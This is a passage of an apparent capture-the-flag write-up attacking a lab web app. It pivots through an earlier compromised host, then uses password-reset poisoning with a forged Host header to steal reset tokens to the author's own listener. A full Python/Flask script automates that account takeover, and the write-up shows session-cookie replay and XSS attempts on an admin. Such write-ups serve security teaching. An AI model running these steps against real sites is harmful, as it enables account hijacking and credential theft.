abriel                  [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 121ms]
abrianna                [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 122ms]
chiarra                 [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 67ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</pre></div>
</div>
<p>Now I get an error from varnish<br />
<img alt="varnish.png" src="../../../../_images/varnish.png" /></p>
<p>Trying to pivot through a previously owned box to see if my ip is blacklisted:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>-vfNCD<span class="w"> </span><span class="m">8000</span><span class="w"> </span>angoose@stocker.htb
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>curl -x socks://127.0.0.1:8000 &#39;http://10.10.11.188/login&#39;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;503 Backend fetch failed&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Error 503 Backend fetch failed&lt;/h1&gt;
    &lt;p&gt;Backend fetch failed&lt;/p&gt;
    &lt;h3&gt;Guru Meditation:&lt;/h3&gt;
    &lt;p&gt;XID: 3244052&lt;/p&gt;
    &lt;hr&gt;
    &lt;p&gt;Varnish cache server&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</pre></div>
</div>
<p>Yea, no…  looks like I might have borked it, time to reset</p>
<p>After a reset it now shows this as a comment in the source of <code class="docutils literal notranslate"><span class="pre">/login</span></code>:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- Q1 release fix by robert-dev-10036 --&gt;</span>
</pre></div>
</div>
<p>That was showing like that before… nevermind:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- Q1 release fix by--&gt;</span>
</pre></div>
</div>
<p>Trying to login with that an a bogus password in <code class="docutils literal notranslate"><span class="pre">/login</span></code> gives us the same <code class="docutils literal notranslate"><span class="pre">Invalid</span> <span class="pre">Credentials</span></code> as before<br />
But in the <code class="docutils literal notranslate"><span class="pre">/forgot</span></code> page we get a new error:<br />
<img alt="robert.png" src="../../../../_images/robert.png" /></p>
<p>So this user is valid and a <code class="docutils literal notranslate"><span class="pre">Password</span> <span class="pre">reset</span> <span class="pre">link</span> <span class="pre">has</span> <span class="pre">been</span> <span class="pre">sent</span> <span class="pre">to</span> <span class="pre">user</span> <span class="pre">inbox</span></code>, can we steal that?<br />
Trying to do some password reset poisoning as described in this <a class="reference external" href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">portswigger post</a>.</p>
<p><img alt="req.png" src="../../../../_images/req.png" /></p>
<p>And if we’re listening locally we can catch that token</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span><span class="w"> </span>...
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span>code<span class="w"> </span><span class="m">404</span>,<span class="w"> </span>message<span class="w"> </span>File<span class="w"> </span>not<span class="w"> </span>found
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /reset?token=vh57l92o3dRhzzoMfw8qaXSK62JTzfc595xA96sb4k7N%2BoTwaoIui76o93mHnvx6lXXmybMxZBLltlxp3SSyCA%3D%3D HTTP/1.1&quot;</span><span class="w"> </span><span class="m">404</span><span class="w"> </span>-
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span>code<span class="w"> </span><span class="m">404</span>,<span class="w"> </span>message<span class="w"> </span>File<span class="w"> </span>not<span class="w"> </span>found
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /reset?token=DJ0eyqWHi%2FuAdX0EaRDquVwbmTuDE675rh1BkyoB00TFldCO%2BGfJa8m4kvVVdF62whm9tLaVrYX99a1CiGmCeA%3D%3D HTTP/1.1&quot;</span><span class="w"> </span><span class="m">404</span><span class="w"> </span>-
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span>code<span class="w"> </span><span class="m">404</span>,<span class="w"> </span>message<span class="w"> </span>File<span class="w"> </span>not<span class="w"> </span>found
<span class="m">10</span>.10.11.188<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Jan/2023<span class="w"> </span><span class="m">23</span>:33:34<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /reset?token=A8TniCi1v3vIg0cfzWe8tyO85JVHbtAhvCSwu0veBSGFXH95AcrivMcH34vA6%2BPw1SyBycGoNL0zgMnJjp4ihA%3D%3D HTTP/1.1&quot;</span><span class="w"> </span><span class="m">404</span><span class="w"> </span>-
</pre></div>
</div>
<p>Of course this was meant to be sent from the server to the server and we know from our earlier enum that the <code class="docutils literal notranslate"><span class="pre">/reset</span></code> path exists, so lets try to hit it with the token</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://10.10.11.188/reset?token=vh57l92o3dRhzzoMfw8qaXSK62JTzfc595xA96sb4k7N%2BoTwaoIui76o93mHnvx6lXXmybMxZBLltlxp3SSyCA%3D%3D
</pre></div>
</div>
<p>And we get a <code class="docutils literal notranslate"><span class="pre">success</span></code> error now:<br />
<img alt="success.png" src="../../../../_images/success.png" /></p>
<p>So we should now be able to login, but this isn’t working because the site is borked again?<br />
<img alt="motherfucker.png" src="../../../../_images/motherfucker.png" /></p>
<p>Resetting the box and trying the whole process once more.<br />
Finally got in</p>
<p>So now we got a session cookie:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span>-b<span class="w"> </span><span class="s1">&#39;session=e619bd1a-4f08-4411-9774-0e4267e7504d&#39;</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.188/home&#39;</span>
HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
Server:<span class="w"> </span>Werkzeug/2.1.2<span class="w"> </span>Python/3.8.10
Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">29</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">10</span>:19:31<span class="w"> </span>GMT
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length:<span class="w"> </span><span class="m">6540</span>
Set-Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>e619bd1a-4f08-4411-9774-0e4267e7504d<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/
X-Varnish:<span class="w"> </span><span class="m">229455</span>
Age:<span class="w"> </span><span class="m">0</span>
Via:<span class="w"> </span><span class="m">1</span>.1<span class="w"> </span>varnish<span class="w"> </span><span class="o">(</span>Varnish/6.2<span class="o">)</span>
Accept-Ranges:<span class="w"> </span>bytes
Connection:<span class="w"> </span>keep-alive
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span><span class="s1">&#39;http://10.10.11.188/home&#39;</span>
HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>FOUND
Server:<span class="w"> </span>Werkzeug/2.1.2<span class="w"> </span>Python/3.8.10
Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">29</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">10</span>:19:41<span class="w"> </span>GMT
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length:<span class="w"> </span><span class="m">189</span>
Location:<span class="w"> </span>/
X-Varnish:<span class="w"> </span><span class="m">229458</span>
Age:<span class="w"> </span><span class="m">0</span>
Via:<span class="w"> </span><span class="m">1</span>.1<span class="w"> </span>varnish<span class="w"> </span><span class="o">(</span>Varnish/6.2<span class="o">)</span>
Connection:<span class="w"> </span>keep-alive
</pre></div>
</div>
<p>All this seems a bit short lived, as it seems the dev user is beeing updated regularly by some scripts for the needs of the CTF. So here’s a quick and dirty python script to automate fetching the user, stealing the reset password link and resetting the password:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">base64</span><span class="w"> </span><span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">parse_qs</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>

<span class="n">log</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;werkzeug&#39;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_username</span><span class="p">():</span>
    <span class="n">login</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
    <span class="n">login</span> <span class="o">=</span> <span class="n">login</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">dev_comment</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">login</span> <span class="k">if</span> <span class="s2">&quot;Q1 release fix by&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">dev_comment</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;by &quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">username</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Found username: &quot;</span> <span class="o">+</span> <span class="n">username</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">username</span>

<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;10.10.11.188&quot;</span>
<span class="n">my_ip</span> <span class="o">=</span> <span class="s2">&quot;10.10.14.53&quot;</span>
<span class="n">passwd</span> <span class="o">=</span> <span class="s2">&quot;asdf&quot;</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">()</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">trigger_iforgot</span><span class="p">():</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">/forgot?username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">my_ip</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;Please use the link to reset your password&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Password link sent. Awaiting token...&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">change_password</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s1">/reset?token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;password=</span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="n">host</span>
    <span class="p">}</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sending password change request to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;Success&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/reset&quot;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">reset_listener</span><span class="p">():</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:][</span><span class="mi">0</span><span class="p">]</span>
    <span class="c1">#print(&quot;received: &quot; + token)</span>
    <span class="n">change_password</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">&quot;Success&quot;</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">trigger_iforgot</span><span class="p">()</span>
  <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="enumerating-the-webapp-further-as-robert">
<h2>Enumerating the webapp further as robert<a class="headerlink" href="#enumerating-the-webapp-further-as-robert" title="Permalink to this heading">#</a></h2>
<p>So we’re logged in as robert<br />
Let’s have dirsearch running in the background with that cookie set
We have access to <code class="docutils literal notranslate"><span class="pre">/tickets</span></code> wich shows existing tickets<br />
And <code class="docutils literal notranslate"><span class="pre">/escalate</span></code> which lets us escalate existing tickets to the admin with a link and a reason field<br />
This is sent as a POST that looks like this:</p>
<p>request</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">escalate</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="mf">10.10.11.188</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">155</span>
<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.188</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.188</span><span class="o">/</span><span class="n">escalate</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">__hstc</span><span class="o">=</span><span class="mf">37486847.8e5</span><span class="n">c3224c1cd5c149271923b09aae509</span><span class="mf">.1674944197616.1674944197616.1674944197616.1</span><span class="p">;</span> <span class="n">hubspotutk</span><span class="o">=</span><span class="mf">8e5</span><span class="n">c3224c1cd5c149271923b09aae509</span><span class="p">;</span> <span class="n">__hssrc</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">__hssc</span><span class="o">=</span><span class="mf">37486847.46.1674944197616</span><span class="p">;</span> <span class="n">session</span><span class="o">=</span><span class="n">e619bd1a</span><span class="o">-</span><span class="mi">4</span><span class="n">f08</span><span class="o">-</span><span class="mi">4411</span><span class="o">-</span><span class="mi">9774</span><span class="o">-</span><span class="mf">0e4267</span><span class="n">e7504d</span>

<span class="n">to</span><span class="o">=</span><span class="n">Admin</span><span class="o">&amp;</span><span class="n">link</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.53</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">hello</span><span class="o">&amp;</span><span class="n">reason</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.53</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">hello</span><span class="o">&amp;</span><span class="n">issue</span><span class="o">=</span><span class="n">Getting</span> <span class="n">error</span> <span class="k">while</span> <span class="n">accessing</span> <span class="n">search</span> <span class="n">feature</span> <span class="ow">in</span> <span class="n">enterprise</span> <span class="n">platform</span><span class="o">.</span>
</pre></div>
</div>
<p>response</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">Werkzeug</span><span class="o">/</span><span class="mf">2.1.2</span> <span class="n">Python</span><span class="o">/</span><span class="mf">3.8.10</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">29</span> <span class="n">Jan</span> <span class="mi">2023</span> <span class="mi">10</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">23</span> <span class="n">GMT</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">62</span>
<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">session</span><span class="o">=</span><span class="n">e619bd1a</span><span class="o">-</span><span class="mi">4</span><span class="n">f08</span><span class="o">-</span><span class="mi">4411</span><span class="o">-</span><span class="mi">9774</span><span class="o">-</span><span class="mf">0e4267</span><span class="n">e7504d</span><span class="p">;</span> <span class="n">HttpOnly</span><span class="p">;</span> <span class="n">Path</span><span class="o">=/</span>
<span class="n">X</span><span class="o">-</span><span class="n">Varnish</span><span class="p">:</span> <span class="mi">3213363</span>
<span class="n">Age</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Via</span><span class="p">:</span> <span class="mf">1.1</span> <span class="n">varnish</span> <span class="p">(</span><span class="n">Varnish</span><span class="o">/</span><span class="mf">6.2</span><span class="p">)</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Ranges</span><span class="p">:</span> <span class="nb">bytes</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>

<span class="n">This</span> <span class="n">request</span> <span class="n">can</span><span class="s1">&#39;t be reviewed since the issue link is flagged</span>
</pre></div>
</div>
<p><img alt="escalate.png" src="../../../../_images/escalate.png" /></p>
<p>Trying a few things, it looks like:</p>
<ul class="simple">
<li><p>external ip or domain names are beeing flagged</p></li>
<li><p>doesn’t need to start with http://</p></li>
<li><p>if it starts with http:// it needs to be the local ip and it can’t have a port spec</p></li>
</ul>
<p>Since we can send a ticket for review by the admin through the escalate endpoint, I tried to do some xss to get the cookie from the admin, a few url filtering evasion techniques, as described in this <a class="reference external" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#url-string-evasion">OWASP cheat sheet</a><br />
Some techniques seems to successfully bypass the filter, but I still didn’t get a callback</p>
<p>The directory search didn’t really find anything more than what we found manually</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>--cookie<span class="o">=</span><span class="s1">&#39;session=e619bd1a-4f08-4411-9774-0e4267e7504d&#39;</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.188<span class="w">                                                                                           </span>

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">56158</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/10.10.11.188/_23-01-28_23-58-01.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-01-28_23-58-01.log

Target:<span class="w"> </span>http://10.10.11.188/

<span class="o">[</span><span class="m">23</span>:58:01<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">23</span>:58:02<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/login
<span class="o">[</span><span class="m">23</span>:58:02<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>6KB<span class="w"> </span>-<span class="w"> </span>/home
<span class="o">[</span><span class="m">23</span>:58:06<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>7KB<span class="w"> </span>-<span class="w"> </span>/tickets
<span class="o">[</span><span class="m">23</span>:58:26<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/reset
<span class="o">[</span><span class="m">00</span>:02:01<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>9KB<span class="w"> </span>-<span class="w"> </span>/escalate

Task<span class="w"> </span>Completed
</pre></div>
</div>
<p>Starting sqlmap in the backgroud</p>
<p>Looking at the source, we learn about the address of the escalated tab:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">nav</span> <span class="n">class</span><span class="o">=</span><span class="s2">&quot;navbar&quot;</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;/home&quot;</span><span class="o">&gt;</span><span class="n">home</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;/tickets&quot;</span><span class="o">&gt;</span><span class="n">tickets</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;/escalate&quot;</span><span class="o">&gt;</span><span class="n">escalate</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;/admin_tickets&quot;</span> <span class="n">class</span><span class="o">=</span><span class="s2">&quot;disabled&quot;</span><span class="o">&gt;</span><span class="n">tickets</span><span class="p">(</span><span class="n">escalated</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-b<span class="w"> </span><span class="s1">&#39;session=e619bd1a-4f08-4411-9774-0e4267e7504d&#39;</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.188/admin_tickets&#39;</span>
&lt;!doctype<span class="w"> </span>html&gt;
&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span>en&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>redirected<span class="w"> </span>automatically<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>URL:<span class="w"> </span>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/home?err=ACCESS_DENIED&quot;</span>&gt;/home?err<span class="o">=</span>ACCESS_DENIED&lt;/a&gt;.<span class="w"> </span>If<span class="w"> </span>not,<span class="w"> </span>click<span class="w"> </span>the<span class="w"> </span>link.
</pre></div>
</div>
</section>
<section id="varnish-cache-poisoning">
<h2>Varnish cache poisoning<a class="headerlink" href="#varnish-cache-poisoning" title="Permalink to this heading">#</a></h2>
<p>This is what the <code class="docutils literal notranslate"><span class="pre">X-Varnish</span></code> header is for According to varnish’s documentation</p>
